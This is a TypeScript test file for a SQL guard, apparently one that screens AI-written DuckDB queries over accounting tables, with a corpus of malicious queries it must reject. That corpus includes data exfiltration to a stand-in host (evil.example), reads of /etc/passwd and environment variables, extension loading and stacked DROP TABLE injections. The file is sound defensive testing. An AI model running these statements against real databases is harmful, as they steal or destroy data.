/**
 * SPEC §34 Phase 8 acceptance: the guard blocks the malicious corpus. Every entry must be rejected;
 * legitimate analytical queries must pass; property tests check that nothing forbidden survives
 * whatever it is embedded in.
 */

import fc from "fast-check";
import { beforeAll, describe, expect, it } from "vitest";

import { guardSql, loadGuard, typedNumbers } from "../src/index";

beforeAll(async () => {
  await loadGuard();
});

const guard = (sql: string) => guardSql(sql, { maxRows: 50 });

const MALICIOUS: readonly string[] = [
  // Not SELECT
  "COPY balances TO 'out.csv'",
  "COPY (SELECT * FROM balances) TO 'https://evil.example/x'",
  "ATTACH 'x.db' AS x",
  "DETACH x",
  "INSTALL httpfs",
  "LOAD httpfs",
  "PRAGMA database_list",
  "SET enable_external_access = true",
  "RESET lock_configuration",
  "CALL pragma_version()",
  "EXPORT DATABASE 'dump'",
  "IMPORT DATABASE 'dump'",
  "CREATE TABLE x AS SELECT * FROM balances",
  "CREATE VIEW v AS SELECT 1",
  "INSERT INTO balances VALUES (1)",
  "UPDATE balances SET closing_paise = 0",
  "DELETE FROM balances",
  "DROP TABLE balances",
  "ALTER TABLE balances ADD COLUMN x int",
  "TRUNCATE balances",
  "VACUUM",
  "EXPLAIN SELECT * FROM balances",
  "BEGIN",
  // Stacked and hidden statements
  "SELECT 1; DROP TABLE balances",
  "SELECT * FROM balances; COPY balances TO 'x.csv'",
  "SELECT * FROM balances -- ; DROP TABLE balances",
  "SELECT * FROM balances /* */",
  "SELECT 1 AS a\u0000; DROP TABLE x",
  // Table functions and replacement scans
  "SELECT * FROM read_csv('secrets.csv')",
  "SELECT * FROM read_csv_auto('/etc/passwd')",
  "SELECT * FROM read_parquet('s3://bucket/x.parquet')",
  "SELECT * FROM read_json('x.json')",
  "SELECT * FROM glob('*')",
  "SELECT * FROM 'data.csv'",
  'SELECT * FROM "data.csv"',
  "SELECT * FROM data.csv",
  "SELECT * FROM duckdb_settings()",
  "SELECT * FROM information_schema.tables",
  "SELECT * FROM pg_catalog.pg_tables",
  "SELECT * FROM system.main.balances",
  "SELECT * FROM other_table",
  "SELECT * FROM balances, LATERAL read_csv('x.csv')",
  "SELECT * FROM (SELECT * FROM read_text('x')) t",
  "WITH x AS (SELECT * FROM read_csv('y.csv')) SELECT * FROM x",
  "SELECT (SELECT count(*) FROM read_csv('x.csv'))",
  "SELECT * FROM balances WHERE ledger IN (SELECT content FROM read_text('a.txt'))",
  // Dangerous functions
  "SELECT getenv('HOME')",
  "SELECT current_setting('enable_external_access')",
  "SELECT read_blob('x')",
  "SELECT pg_sleep(100)",
  "SELECT load_extension('x')",
  "SELECT httpfs_get('https://evil.example')",
  "SELECT evil.sum(closing_paise) FROM balances",
  "SELECT sum(closing_paise) FILTER (WHERE true) FROM balances WHERE ledger = query('SELECT 1')",
  "SELECT 'https://evil.example/exfil?' || ledger FROM balances",
  "SELECT * FROM balances WHERE ledger = 's3://bucket/key'",
  "SELECT 'C:\\Windows\\system.ini' AS p",
  // Other statement forms
  "SELECT * INTO new_table FROM balances",
  "SELECT * FROM balances FOR UPDATE",
  "SELECT $1",
  "SELECT ARRAY[1,2]",
  "SELECT x::regclass FROM balances",
  "",
  "   ",
];

const LEGITIMATE: readonly string[] = [
  "SELECT head, sum(closing_paise) AS closing FROM balances WHERE period = '2026-05' GROUP BY head ORDER BY closing DESC",
  "WITH m AS (SELECT period, sum(debit_paise - credit_paise) AS movement FROM balances WHERE head = 'REV' GROUP BY period) SELECT period, movement, lag(movement) OVER (ORDER BY period) AS previous FROM m",
  "SELECT ledger, closing_paise, rank() OVER (PARTITION BY period ORDER BY closing_paise DESC) AS r FROM balances WHERE head = 'CA_RECEIVABLES'",
  "SELECT b.party, sum(b.amount_paise) FROM bills b WHERE b.side = 'receivable' AND b.days_outstanding > 90 GROUP BY b.party HAVING sum(b.amount_paise) > 0",
  "SELECT CASE WHEN days_outstanding <= 30 THEN '0-30' ELSE 'over 30' END AS bucket, count(*) FROM bills GROUP BY 1",
  "SELECT coalesce(nullif(head_name, ''), head) AS name, round(avg(closing_paise)) FROM main.balances GROUP BY 1",
  "SELECT period, CAST(sum(closing_paise) AS BIGINT) FROM balances GROUP BY period LIMIT 5;",
  "SELECT date_trunc('month', bill_date) AS m, count(*) FROM bills GROUP BY m",
  "SELECT * FROM balances b JOIN bills p ON p.party = b.ledger WHERE b.period = p.period",
];

describe("SQL guard", () => {
  it.each(MALICIOUS)("rejects %j", (sql) => {
    const r = guard(sql);
    expect(r.ok, JSON.stringify(r)).toBe(false);
  });

  it.each(LEGITIMATE)("allows %j, wrapped with the row cap", (sql) => {
    const r = guard(sql);
    if (!r.ok) throw new Error(r.reason);
    expect(r.sql).toMatch(/^SELECT \* FROM \(.*\) AS guarded_query LIMIT 51$/su);
    expect(guard(r.sql).ok).toBe(true);
  });

  it("reports the session tables a query reads", () => {
    const r = guard(LEGITIMATE[8] ?? "");
    expect(r.ok && r.tables).toEqual(["balances", "bills"]);
  });

  it("a CTE may not shadow a session table to smuggle a table function", () => {
    expect(
      guard("WITH balances AS (SELECT * FROM read_csv('x')) SELECT * FROM balances").ok,
    ).toBe(false);
  });

  it("no forbidden construct survives embedding in any position (property)", () => {
    const forbidden = fc.constantFrom(
      "read_csv('x.csv')",
      "COPY balances TO 'x'",
      "getenv('A')",
      "'http://x'",
      "ATTACH 'x'",
      "; DROP TABLE balances",
      "-- c",
      "/* c */",
      "glob('*')",
      "duckdb_settings()",
    );
    const filler = fc.constantFrom(
      "SELECT ",
      " FROM balances",
      " WHERE ",
      " sum(closing_paise) ",
      " (SELECT ",
      ") ",
      " , ",
      " AND ",
      " = ",
      " UNION ALL SELECT ",
      " JOIN ",
      " ON true ",
      " 1 ",
    );
    fc.assert(
      fc.property(
        fc.array(filler, { maxLength: 8 }),
        forbidden,
        fc.array(filler, { maxLength: 8 }),
        (a, bad, b) => {
          const sql = [...a, bad, ...b].join("");
          expect(guard(sql).ok).toBe(false);
        },
      ),
      { numRuns: 2000 },
    );
  });

  it("arbitrary strings never crash the guard and never pass unless they are a plain SELECT", () => {
    fc.assert(
      fc.property(fc.string({ maxLength: 200 }), (s) => {
        const r = guard(s);
        if (r.ok)
          expect(
            s.trim().toUpperCase().startsWith("SELECT") ||
              s.trim().toUpperCase().startsWith("WITH") ||
              s.trim().startsWith("("),
          ).toBe(true);
      }),
      { numRuns: 3000 },
    );
  });
});

describe("figures in a Deep query (locked decision 7, ADR 0077)", () => {
  const deep = (sql: string, question = "") =>
    guardSql(sql, { maxRows: 50, figures: { max: 1000, typed: typedNumbers(question) } });

  it("refuses a query that reads no table: its cells would be figures the model wrote", () => {
    // What a live run did: two balances copied out of an earlier result and subtracted.
    const r = deep("SELECT (-369578700) - (-208719400) AS june_sales_paise");
    expect(r.ok).toBe(false);
    // Without the Deep rule the guard still takes it, as before.
    expect(guardSql("SELECT (-369578700) - (-208719400) AS x", { maxRows: 50 }).ok).toBe(
      true,
    );
  });

  it("refuses a large number the question did not give, even in a query over a table", () => {
    expect(deep("SELECT closing_paise - 208719400 AS x_paise FROM balances").ok).toBe(
      false,
    );
    expect(
      deep("SELECT closing_paise FROM balances WHERE closing_paise > 2087194.5").ok,
    ).toBe(false);
  });

  it("allows small structural numbers and the figures the customer typed", () => {
    expect(
      deep(
        "SELECT count(*) AS pending_bills FROM bills WHERE days_outstanding > 90 ORDER BY 1 LIMIT 5",
      ).ok,
    ).toBe(true);
    expect(
      deep(
        "SELECT sum(CASE WHEN period = '2025-06' THEN closing_paise ELSE 0 END) * 100 AS x_paise FROM balances",
      ).ok,
    ).toBe(true);
    expect(
      deep(
        "SELECT ledger FROM balances WHERE closing_paise > 50000000",
        "Which customers owe more than 5 lakh?",
      ).ok,
    ).toBe(true);
    expect(
      deep(
        "SELECT ledger FROM balances WHERE closing_paise > 15000000",
        "Who owes more than 1,50,000?",
      ).ok,
    ).toBe(true);
  });

  it("reads a number with its scale word, in rupees and in paise", () => {
    expect(typedNumbers("more than 5 lakh")).toEqual(
      expect.arrayContaining(["5", "500", "500000", "50000000"]),
    );
    expect(typedNumbers("above 2.5 crore")).toEqual(
      expect.arrayContaining(["25000000", "2500000000"]),
    );
    expect(typedNumbers("over 1,50,000")).toEqual(
      expect.arrayContaining(["150000", "15000000"]),
    );
    expect(typedNumbers("no numbers here")).toEqual([]);
  });
});
